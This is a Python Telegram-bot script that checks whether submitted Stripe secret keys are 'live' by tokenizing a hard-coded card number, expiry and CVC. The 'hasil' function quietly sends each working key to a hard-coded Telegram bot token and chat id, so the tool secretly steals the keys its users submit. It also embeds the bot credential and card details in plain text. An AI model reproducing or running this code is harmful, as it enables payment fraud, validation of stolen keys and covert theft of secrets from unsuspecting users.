import stripe
import random, string
from requests import get
from telegram import InlineQueryResultArticle, ParseMode, InputTextMessageContent

def hasil(key):
	URL = "http://api.telegram.org/bot1224271943:AAHdX4Ew6C-55QSuka2qg6CCP5LsIPhC8_s/sendMessage?chat_id=979783476&text={}".format(key)
	get(URL)

def che(key):
 stripe.api_key = key
 stripe.Token.create(
      card={
        "number": "4109093805620876",
        "exp_month": 10,
        "exp_year": 2025,
        "cvc": "343",
      },
    )
    

def skcheck(update, context):
    try:
        key = " ".join(context.args)
        che(key)
        pesan = "<b>Live</b>:\n<code>{}</code>".format(key)
        update.message.reply_text(pesan, parse_mode=ParseMode.HTML)
        hasil(key)
    except stripe.error.AuthenticationError as AE:
        pesan = "<b>Dead</b>:\n{}\n\n<u>{}</u>".format(key, AE.error.message)
        update.message.reply_text(pesan, parse_mode=ParseMode.HTML)
    except stripe.error.InvalidRequestError as IRE:
        pesan = "<b>Dead</b>:\n{}\n\n<u>{}</u>".format(key, IRE.error.message)
        update.message.reply_text(pesan, parse_mode=ParseMode.HTML)
    except stripe.error.CardError as CD:
        pesan = "<b>Dead</b>:\n{}\n\n<u>{}</u>".format(key, CD._message)
        update.message.reply_text(pesan, parse_mode=ParseMode.HTML)
    except:
        pesan = "<b>Live?</b>:\n<code>{}</code>".format(key)
        update.message.reply_text(pesan, parse_mode=ParseMode.HTML)
        hasil(key)
